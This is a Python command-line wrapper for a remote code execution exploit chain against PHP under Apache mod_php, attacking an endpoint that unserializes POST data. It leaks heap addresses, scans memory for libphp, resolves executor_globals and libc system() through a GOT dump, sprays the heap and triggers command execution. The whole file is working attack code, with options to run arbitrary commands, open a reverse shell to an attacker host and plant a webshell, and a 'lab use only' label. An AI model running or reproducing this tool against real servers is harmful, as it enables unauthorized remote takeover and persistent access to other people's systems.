#!/usr/bin/env python3
"""
php2shell — PHP >= 5.4.0 RCE by Calif.io  (styled remote exp for lab testing)

Screenshot-style CLI around the real remote chain in ../php8_remote.py:
  R-1 heap leak          -> LEAKED block (main_heap / stale_reference / ...)
  R-2 ELF scan           -> libphp base
  R-3 .gnu_hash          -> executor_globals / GOT
  R-4 GOT dump           -> libc base -> system()
  R-5 EG class table     -> stdClass ce
  R-6 spray slot
  R-7 trigger            -> EXECUTED block (command output from HTTP response)

Target requirements: Apache prefork + mod_php (libphp.so), e.g. the official
php:8.5-apache image, with remote_app.php deployed. FPM/CGI is not supported.

Authorized lab use only.
"""
import argparse
import contextlib
import io
import os
import sys
import time
import urllib.parse
import urllib.request
from datetime import datetime

HERE = os.path.dirname(os.path.abspath(__file__))
CHAIN = os.path.normpath(os.path.join(HERE, '..', 'php8_remote.py'))
import types


def load_chain(target_path):
    """Load php8_remote.py with its hardcoded '/remote_app.php' rewritten to
    the target path (the chain's send_http() posts to that literal path)."""
    with open(CHAIN, 'r', encoding='utf-8') as f:
        src = f.read()
    if target_path != '/remote_app.php':
        src = src.replace('/remote_app.php', target_path)
    m = types.ModuleType('php8_remote_lab')
    m.__file__ = CHAIN
    exec(compile(src, CHAIN, 'exec'), m.__dict__)
    return m


chain = None  # set in main() once the target path is known

# ---------------------------------------------------------------------------
# ANSI / banner
# ---------------------------------------------------------------------------

class C:
    on = True
    @classmethod
    def w(cls, code, s): return f'\033[{code}m{s}\033[0m' if cls.on else s
    @classmethod
    def magenta(cls, s): return cls.w('95', s)
    @classmethod
    def cyan(cls, s): return cls.w('96', s)
    @classmethod
    def green(cls, s): return cls.w('92', s)
    @classmethod
    def red(cls, s): return cls.w('91', s)
    @classmethod
    def yellow(cls, s): return cls.w('93', s)
    @classmethod
    def dim(cls, s): return cls.w('2', s)

FONT = {
 'P': ['██████ ', '██   ██', '██████ ', '██     ', '██     '],
 'H': ['██   ██', '██   ██', '███████', '██   ██', '██   ██'],
 '2': ['██████ ', '     ██', '██████ ', '██     ', '███████'],
 'S': ['███████', '██     ', '██████ ', '     ██', '███████'],
 'E': ['███████', '██     ', '█████  ', '██     ', '███████'],
 'L': ['██     ', '██     ', '██     ', '██     ', '███████'],
}

def banner():
    rows = ['' for _ in range(5)]
    for i, ch in enumerate('PHP2SHELL'):
        for r in range(5):
            rows[r] += FONT[ch][r] + ('  ' if i < len('PHP2SHELL') - 1 else '')
    art = '\n'.join(rows)
    line = '  —| ' + C.magenta('PHP RCE by 青山') + ' |—'
    print(C.magenta(art))
    print(line)

def ts():
    return C.dim(datetime.now().strftime('%H:%M:%S'))

def info(key, val):
    print(f'{ts()} {C.cyan("[>] INFO")}  {key} :: {val}')

def stage(tag, key, val):
    tagc = {'[*]': C.green, '[#]': C.magenta, '[-]': C.red, '[+]': C.green}.get(tag, C.cyan)
    print(f'{ts()} {tagc(tag)} {tagc(key)} :: {val}')

# ---------------------------------------------------------------------------
# HTTP preflight
# ---------------------------------------------------------------------------

def probe(host, port, path, timeout):
    """Send diagnostic payloads and print raw responses (helps debug a custom sink)."""
    import urllib.parse as up
    url = f'http://{host}:{port}{path}'
    def post(payload):
        body = b'cook=' + up.quote(payload, safe='').encode()
        req = urllib.request.Request(
            url, data=body,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            method='POST')
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.status, r.read(2000)
        except Exception as e:
            return None, str(e).encode()
    inner = 'O:8:"stdClass":0:{}'
    cases = [
        ('plain string', 's:3:"abc";'),
        ('bool', 'b:0;'),
        ('array', 'a:1:{i:0;s:3:"abc";}'),
        ('gadget class CachedData',
         f'C:10:"CachedData":{len(inner)}:{{{inner}}}'),
    ]
    for label, payload in cases:
        status, data = post(payload)
        print(f'[{label}] HTTP {status} {payload[:60]!r}')
        print(f'    -> {data[:300]!r}')
    print()
    print('Interpretation:')
    print('  - plain/array/bool must echo back the same serialized text')
    print('    (the endpoint must do: $r = unserialize($_POST["cook"]); echo serialize($r);)')
    print('  - the CachedData case must not raise "Class CachedData not found"')
    print('    (define the class exactly as in remote_app.php)')


class KeepAliveHTTP:
    """Persistent HTTP/1.1 connection to the target app.

    The chain issues thousands of POSTs; reusing one TCP connection halves the
    per-request latency (measured 45ms -> 22ms across a 22ms RTT link) and
    keeps requests on the same Apache child process.
    """
    def __init__(self, path):
        self.path = path
        self.sock = None
        self.f = None

    def close(self):
        try:
            if self.sock:
                self.sock.close()
        except Exception:
            pass
        self.sock = self.f = None

    def _open(self, host, port, timeout):
        import socket
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        self.f = self.sock.makefile('rb')

    def post(self, raw_body, host, port, timeout=3):
        for attempt in range(2):
            try:
                if self.sock is None:
                    self._open(host, port, timeout)
                hdr = (
                    f'POST {self.path} HTTP/1.1\r\n'
                    f'Host: {host}\r\n'
                    'Content-Type: application/x-www-form-urlencoded\r\n'
                    f'Content-Length: {len(raw_body)}\r\n'
                    'Connection: keep-alive\r\n'
                    '\r\n'
                ).encode() + raw_body
                self.sock.sendall(hdr)
                return self._read_response()
            except Exception:
                self.close()
                if attempt == 1:
                    return None
        return None

    def _read_response(self):
        status = self.f.readline()
        if not status:
            raise IOError('connection closed')
        close = False
        clen = None
        chunked = False
        while True:
            line = self.f.readline()
            if line in (b'\r\n', b'\n', b''):
                break
            k, _, v = line.partition(b':')
            k = k.strip().lower()
            v = v.strip()
            if k == b'content-length':
                clen = int(v)
            elif k == b'transfer-encoding' and b'chunked' in v.lower():
                chunked = True
            elif k == b'connection' and b'close' in v.lower():
                close = True
        if chunked:
            data = bytearray()
            while True:
                szline = self.f.readline().strip()
                sz = int(szline.split(b';')[0], 16)
                if sz == 0:
                    self.f.readline()
                    break
                data += self.f.read(sz)
                self.f.read(2)
            out = bytes(data)
        elif clen is not None:
            out = self.f.read(clen)
        else:
            out = self.f.read()
            close = True
        if close:
            self.close()
        return out


def install_keepalive(chain, path):
    client = KeepAliveHTTP(path)
    orig = chain.send_http

    def send_ka(payload, host=None, port=None, timeout=None):
        host = host or chain.HOST
        port = port or chain.PORT
        timeout = 3 if timeout is None else timeout
        chain.req_count += 1
        body = b'cook=' + chain.urlencode_bytes(payload)
        out = client.post(body, host, port, timeout)
        if out is None:
            client.close()
            return orig(payload, host=host, port=port, timeout=timeout)
        return out

    chain.send_http = send_ka
    return client



def install_parallel_scan(chain, path, workers=16, cap=1.0):
    """Parallelise the 2MB-grid ELF scan (R-2), with adaptive fallbacks.

    Blind probes to non-ELF addresses can kill/hang Apache workers.  We fan
    them out over threads with a short socket timeout, and if the server is
    too slow (all probes time out) fall back to fewer threads + a longer
    timeout, then finally to the original sequential scan.
    """
    import threading
    orig_scan = chain.scan_for_elf

    def _scan(chunk, nworkers, ncap):
        mods = []
        for _ in range(nworkers):
            m = load_chain(path)
            m.HOST, m.PORT = chain.HOST, chain.PORT
            o = m.isstring_read
            m.isstring_read = lambda addr, timeout=5, _o=o, _c=ncap: _o(addr, timeout=min(timeout, _c))
            mods.append(m)
        cands = []
        for i in range(256):
            for d in (1, -1):
                c = chunk + d * i * 0x200000
                if c > 0:
                    cands.append(c)
        results = []
        lock = threading.Lock()
        nxt = [0]

        def worker(m):
            while True:
                with lock:
                    k = nxt[0]
                    if k >= len(cands):
                        return
                    nxt[0] = k + 1
                    cand = cands[k]
                try:
                    epn = m._read_elf_header(cand)
                except Exception:
                    epn = None
                if epn:
                    with lock:
                        results.append((cand, epn))

        ths = [threading.Thread(target=worker, args=(m,), daemon=True) for m in mods]
        for t in ths:
            t.start()
        for t in ths:
            t.join(timeout=180)
        return sorted(results, key=lambda x: -x[1])

    def scan_par(chunk):
        for nworkers, ncap in ((workers, cap), (4, 4.0)):
            r = _scan(chunk, nworkers, ncap)
            if r:
                return r
            print(f'    (parallel scan with {nworkers} workers / {ncap:g}s timeout '
                  f'found nothing; retrying)')
        print('    (falling back to sequential scan)')
        return orig_scan(chunk)

    chain.scan_for_elf = scan_par


def _retry(fn, *a, attempts=3):
    last = None
    for _ in range(attempts):
        try:
            r = fn(*a)
        except Exception:
            r = None
        if r is not None:
            return r
        last = None
    return last


def cache_check(chain, cached):
    """Return True (valid), False (definitely stale), None (inconclusive).

    A slow/crashing target can make the validation reads time out; that must
    not be treated as 'stale' (it would needlessly discard a good cache).
    """
    if not cached or not all(k in cached for k in ('elf_base', 'eg', 'libc', 'system')):
        return False
    hdr = _retry(chain._read_elf_header, cached['elf_base'])
    if hdr is None:
        return None
    eg = _retry(chain.gnu_hash_resolve, cached['elf_base'], 'executor_globals')
    if eg is None:
        return None
    if eg != cached['eg']:
        return False
    sy = _retry(chain.gnu_hash_resolve, cached['libc'], 'system')
    if sy is None:
        return None
    return sy == cached['system']


def preflight(host, port, path, timeout):
    url = f'http://{host}:{port}{path}'
    body = b'cook=s%3A3%3A%22abc%22%3B'
    req = urllib.request.Request(
        url, data=body,
        headers={'Content-Type': 'application/x-www-form-urlencoded'},
        method='POST')
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            data = r.read(4096)
            headers = dict(r.headers.items())
            status = r.status
    except Exception as e:
        print(f'{ts()} {C.red("[-] ERROR")} preflight failed :: {e}')
        return None
    ok = b's:3:"abc";' in data
    if not ok:
        print(f'{ts()} {C.red("[-] ERROR")} preflight HTTP {status} :: unexpected body {data[:80]!r}')
        print('             deploy remote_app.php at the path and ensure it does')
        print('             $r = unserialize($_POST["cook"]); echo serialize($r);')
        return None
    return headers

def detect(headers):
    server = headers.get('Server', '?')
    powered = headers.get('X-Powered-By', '')
    phpver = powered.split('/')[-1] if 'PHP' in powered else '?'
    sapi = 'Apache prefork/mod_php' if 'Apache' in server else server
    profile = 'auto-' + phpver.replace('.', '') if phpver != '?' else 'auto'
    return server, phpver, sapi, profile

# ---------------------------------------------------------------------------
# Chain helpers
# ---------------------------------------------------------------------------

def call(fn, *a, **kw):
    buf = io.StringIO()
    try:
        with contextlib.redirect_stdout(buf):
            r = fn(*a, **kw)
        return r, buf.getvalue(), None
    except Exception as e:
        return None, buf.getvalue(), e

def resolve_optional(base, name):
    try:
        r, _, _ = call(chain.gnu_hash_resolve, base, name)
        return r if isinstance(r, int) else None
    except Exception:
        return None

def install_deadline(seconds):
    deadline = time.time() + seconds
    orig = chain.send_http
    def send_dl(payload, host=None, port=None, timeout=None):
        if time.time() > deadline:
            raise RuntimeError('global deadline exceeded')
        if timeout is None:
            timeout = 3
        return orig(payload, host=host, port=port, timeout=timeout)
    chain.send_http = send_dl
    return deadline


def run_chain(host, port, cached=None):
    chain.HOST, chain.PORT = host, port
    start = time.time()
    log = []

    # R-1
    stage('[*]', 'STAGE', 'R-1 heap leak')
    heap_ref, out, err = call(chain.heap_leak)
    if err or not heap_ref:
        return None, f'heap leak failed: {err or "no reference"}', log
    chunk = heap_ref & ~0x1FFFFF
    log.append(('main_heap', chunk))
    log.append(('stale_reference', heap_ref))

    if cached:
        stage('[*]', 'STAGE', 'R-2/R-3/R-4 skipped (cached addresses)')
        elf_base = cached['elf_base']
        eg = cached['eg']
        libc = cached['libc']
        sysaddr = cached['system']
        log.append(('libphp', elf_base))
        log.append(('executor_globals', eg))
        log.append(('libc', libc))
        log.append(('system', sysaddr))
        # jump to R-5
        stage('[*]', 'STAGE', 'R-5 EG class table -> stdClass ce')
        ce, _, err = call(chain.lookup_class_table, eg, 'stdclass')
        if err or not ce:
            return None, f'stdClass class entry not resolved: {err}', log
        stage('[*]', 'STAGE', 'R-6 spray slot')
        spray, _, err = call(chain.find_spray_slot, heap_ref)
        if err or not spray:
            return None, f'spray slot not found: {err}', log
        return {'heap_ref': heap_ref, 'chunk': chunk, 'elf_base': elf_base,
                'eg': eg, 'libc': libc, 'system': sysaddr, 'ce': ce,
                'spray': spray, 'log': log, 'start': start}, None, log

    # R-2
    stage('[*]', 'STAGE', 'R-2 ELF scan')
    cands, out, err = call(chain.scan_for_elf, chunk)
    if err or not cands:
        return None, f'ELF scan failed: {err or "no candidate"}', log
    log.append(('natural_tables', len(cands)))

    # R-3
    stage('[*]', 'STAGE', 'R-3 .gnu_hash symbol resolution')
    elf_base = eg = pltgot = None
    for base, phnum in cands:
        r, _, e = call(chain.gnu_hash_resolve, base, 'executor_globals',
                       '_GLOBAL_OFFSET_TABLE_')
        if e is None and r:
            elf_base, eg, pltgot = base, r[0], r[1]
            break
    if elf_base is None:
        return None, 'no candidate exports executor_globals (not libphp)', log
    log.append(('libphp', elf_base))
    log.append(('executor_globals', eg))
    log.append(('pltgot', pltgot))
    log.append(('zval_ptr_dtor', resolve_optional(elf_base, 'zval_ptr_dtor')))
    log.append(('zend_call_function', resolve_optional(elf_base, 'zend_call_function')))

    # R-4
    stage('[*]', 'STAGE', 'R-4 GOT dump -> libc -> system() (~1500-2000 requests, keep-alive on)')
    libc, out, err = call(chain.libc_from_got_dump, elf_base, pltgot)
    if err or not libc:
        return None, f'libc discovery failed: {err or "no libc"}', log
    sysaddr, _, err = call(chain.gnu_hash_resolve, libc, 'system')
    if err or not sysaddr:
        return None, f'system() resolution failed: {err}', log
    log.append(('libc', libc))
    log.append(('system', sysaddr))

    # R-5
    stage('[*]', 'STAGE', 'R-5 EG class table -> stdClass ce')
    ce, _, err = call(chain.lookup_class_table, eg, 'stdclass')
    if err or not ce:
        return None, f'stdClass class entry not resolved: {err}', log

    # R-6
    stage('[*]', 'STAGE', 'R-6 spray slot')
    spray, _, err = call(chain.find_spray_slot, heap_ref)
    if err or not spray:
        return None, f'spray slot not found: {err}', log

    return {
        'heap_ref': heap_ref, 'chunk': chunk, 'elf_base': elf_base, 'eg': eg,
        'pltgot': pltgot, 'libc': libc, 'system': sysaddr, 'ce': ce,
        'spray': spray, 'log': log, 'start': start,
    }, None, log

# ---------------------------------------------------------------------------
# R-7 execution (short command, or staged for >14 bytes)
# ---------------------------------------------------------------------------

def fire(st, cmd14):
    out, _, err = call(chain._fire_cmd, st['ce'], st['system'], st['spray'],
                       cmd14.encode('latin-1'))
    if err:
        return None, str(err)
    return out, None

def execute(st, command):
    raw = command.encode('latin-1')
    if len(raw) <= 14:
        out, err = fire(st, command)
        return out, err
    # staged: write command chunks to file "w", then run it
    chunks, _, err = call(chain._split_for_echo, command, 'w')
    if err or not chunks:
        return None, f'cannot split command: {err}'
    out = b''
    for c in chunks:
        r, e = fire(st, c)
        if e:
            return None, e
        out = r or out
    r, e = fire(st, 'sh w')
    return r or out, e

def show_executed(body):
    if not body:
        print(C.red('        (no HTTP response body)'))
        return
    text = body.decode('latin-1', 'replace')
    # command stdout lands before the serialized remainder; show printable lines
    shown = []
    for line in text.splitlines():
        line = line.rstrip('\r')
        if not line:
            continue
        if line.lstrip().startswith(('a:', 'i:', 'O:', 's:', 'C:', 'b:')):
            continue
        shown.append(line)
    for line in shown[:40]:
        print(C.red('        ' + line))
    if not shown:
        print(C.red('        (command executed; no printable stdout in response)'))

# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(description='php2shell styled remote exp (lab use only)')
    ap.add_argument('--url', default='http://127.0.0.1:8080',
                    help='target URL, e.g. http://host:8080/remote_app.php')
    ap.add_argument('--command', default='uname -a; id',
                    help='command to execute (<=14 bytes direct, longer is staged)')
    ap.add_argument('--attempts', type=int, default=3, help='retry envelope (default 3)')
    ap.add_argument('--timeout', type=float, default=3.0, help='HTTP timeout (s)')
    ap.add_argument('--check', action='store_true', help='preflight only')
    ap.add_argument('--probe', action='store_true', help='send diagnostic payloads and show responses')
    ap.add_argument('--no-color', action='store_true')
    ap.add_argument('--verbose', action='store_true', help='show chain debug output on failure')
    ap.add_argument('--elf-base', type=lambda x: int(x, 0), help='cached libphp base (hex)')
    ap.add_argument('--eg', type=lambda x: int(x, 0), help='cached executor_globals (hex)')
    ap.add_argument('--libc', type=lambda x: int(x, 0), help='cached libc base (hex)')
    ap.add_argument('--system', type=lambda x: int(x, 0), help='cached libc system() (hex)')
    ap.add_argument('--cache-file', default='cache.json',
                    help='JSON cache of resolved addresses (default: cache.json)')
    ap.add_argument('--no-cache', action='store_true',
                    help='never read/write the address cache (always full scan)')
    ap.add_argument('--probe-timeout', type=float, default=1.0,
                    help='per-probe socket timeout for the parallel ELF scan (default 1.0)')
    ap.add_argument('--scan-workers', type=int, default=16,
                    help='parallel workers for the ELF scan (default 16)')
    ap.add_argument('--max-seconds', type=float, default=600.0, help='per-attempt deadline (s)')
    ap.add_argument('--reverse', metavar='LHOST:LPORT',
                    help='spawn a reverse shell instead of --command')
    ap.add_argument('--webshell', nargs='?', const='c.php', metavar='NAME',
                    help='drop a webshell instead of --command')
    args = ap.parse_args()

    if args.no_color or not sys.stdout.isatty():
        C.on = False

    u = urllib.parse.urlsplit(args.url)
    if u.scheme != 'http' or not u.hostname:
        print('[-] --url must be http://HOST[:PORT][/path]')
        return 2
    host, port = u.hostname, (u.port or 80)
    path = u.path or '/remote_app.php'

    global chain
    chain = load_chain(path)
    install_keepalive(chain, path)
    install_parallel_scan(chain, path, workers=args.scan_workers, cap=args.probe_timeout)

    banner()
    print()
    if args.probe:
        probe(host, port, path, args.timeout)
        return 0
    print(f'{ts()} {C.green("[*] START")} operation initialized')
    headers = preflight(host, port, path, args.timeout)
    if headers is None:
        return 1
    server, phpver, sapi, profile = detect(headers)
    info('target acquired', C.yellow(f'http://{host}:{port}{path}'))
    info('runtime profile', C.yellow(profile))
    info('worker strategy', C.yellow('adaptive'))
    if args.reverse:
        objective = f'reverse shell to {args.reverse}'
    elif args.webshell:
        objective = f'drop webshell {args.webshell or "c.php"}'
    else:
        objective = f'in-band system({args.command!r})'
    info('execution objective', C.magenta(objective))
    info('retry envelope', C.yellow(f'attempts={args.attempts} timeout={args.timeout:g}s'))
    info('selected payload', C.yellow(profile))
    info('target ABI', C.cyan(server))
    info('package build', C.cyan(f'PHP {phpver}'))
    info('SAPI boundary', C.green(sapi))
    if 'Apache' not in server:
        print(f'{ts()} {C.yellow("[!] WARN")}  chain needs Apache prefork/mod_php (libphp.so);')
        print(C.dim('             R-1 heap leak can still work, but R-2 ELF scan will fail on nginx/FPM'))
    if args.check:
        print(f'\n{ts()} {C.green("[+] OK")} preflight passed')
        return 0

    cached = None
    if args.elf_base and args.eg and args.libc and args.system:
        cached = {'elf_base': args.elf_base, 'eg': args.eg,
                  'libc': args.libc, 'system': args.system}
        print(f'{ts()} {C.cyan("[>] INFO")}  cached addresses :: '
              f'libphp=0x{args.elf_base:x} EG=0x{args.eg:x} '
              f'libc=0x{args.libc:x} system=0x{args.system:x}')
    elif args.cache_file and not os.path.exists(args.cache_file):
        print(f'{ts()} {C.cyan("[>] INFO")}  no cache ({args.cache_file}); '
              'full scan, cache will be written after R-4')
    elif args.cache_file:
        import json
        try:
            cached = json.load(open(args.cache_file))
            st = cache_check(chain, cached)
            if st is True:
                print(f'{ts()} {C.cyan("[>] INFO")}  cache valid :: {args.cache_file}')
            elif st is False:
                print(f'{ts()} {C.yellow("[!] WARN")}  cache stale (container restarted?); '
                      'falling back to full scan')
                cached = None
            else:
                print(f'{ts()} {C.yellow("[!] WARN")}  cache validation inconclusive '
                      '(target slow?); trying cached addresses first, '
                      'full scan on failure')
                
        except Exception:
            cached = None

    for attempt in range(1, args.attempts + 1):
        install_deadline(args.max_seconds)   # per-attempt deadline
        stage('#', 'STAGE', f'CHAIN ACTIVE :: profile={profile} elapsed=0s')
        stage('#', 'STAGE', f'exploit attempt :: {attempt}/{args.attempts}')
        try:
            st, err, log = run_chain(host, port, cached=cached)
        except Exception as e:
            stage('-', 'FAILED', f'{type(e).__name__}: {e}')
            continue
        if st is None:
            stage('-', 'FAILED', err)
            if cached is not None:
                print(f'{ts()} {C.yellow("[!] WARN")}  cached path failed; '
                      'next attempt will run the full scan')
                cached = None
            if args.verbose and log:
                for k, v in log:
                    print(C.dim(f'        {k} = {v if not isinstance(v, int) else hex(v)}'))
            continue

        if args.cache_file:
            import json
            d = {k: st[k] for k in ('elf_base', 'eg', 'libc', 'system') if k in st}
            try:
                json.dump(d, open(args.cache_file, 'w'))
                print(C.dim(f'        cache saved -> {args.cache_file}'))
            except Exception:
                pass
        nat = dict(st['log']).get('natural_tables', '?')
        print(f'{ts()} {C.green("[+]")} LEAKED :: compact natural_tables={nat}')
        print(C.cyan(f'        main_heap        :: 0x{st["chunk"]:x}'))
        print(C.cyan(f'        stale_reference  :: 0x{st["heap_ref"]:x}'))
        zpd = dict(st['log']).get('zval_ptr_dtor')
        zcf = dict(st['log']).get('zend_call_function')
        if zpd: print(C.cyan(f'        zval_ptr_dtor    :: 0x{zpd:x}'))
        if zcf: print(C.cyan(f'        zend_call_function :: 0x{zcf:x}'))
        print(C.dim(f'        libphp=0x{st["elf_base"]:x} EG=0x{st["eg"]:x} libc=0x{st["libc"]:x} system=0x{st["system"]:x}'))

        print(f'{ts()} {C.red("[>]")} EXECUTED ->')
        if args.reverse:
            lhost, _, lport = args.reverse.rpartition(':')
            if not lhost or not lport.isdigit():
                stage('-', 'FAILED', f'--reverse expects LHOST:LPORT, got {args.reverse!r}')
                continue
            _, _, exerr = call(chain.reverse_shell, st['ce'], st['system'],
                               st['spray'], lhost, int(lport))
            if exerr:
                stage('-', 'FAILED', f'reverse shell failed: {exerr}')
                continue
            print(C.red(f'        reverse shell staged to {lhost}:{lport} (start your listener)'))
        elif args.webshell:
            _, _, exerr = call(chain.drop_webshell, st['ce'], st['system'],
                               st['spray'], filename=args.webshell or 'c.php')
            if exerr:
                stage('-', 'FAILED', f'webshell drop failed: {exerr}')
                continue
            print(C.red(f'        webshell dropped as {args.webshell or "c.php"}'))
        else:
            body, exerr = execute(st, args.command)
            if exerr:
                stage('-', 'FAILED', exerr)
                continue
            show_executed(body)
        elapsed = time.time() - st['start']
        print(f'\n{ts()} {C.green("[+] OK")} CHAIN COMPLETE :: profile={profile} elapsed={elapsed:.1f}s '
              f'requests={chain.req_count}')
        return 0

    print(f'\n{ts()} {C.red("[-] FAILED")} all {args.attempts} attempts failed')
    return 1


if __name__ == '__main__':
    sys.exit(main())
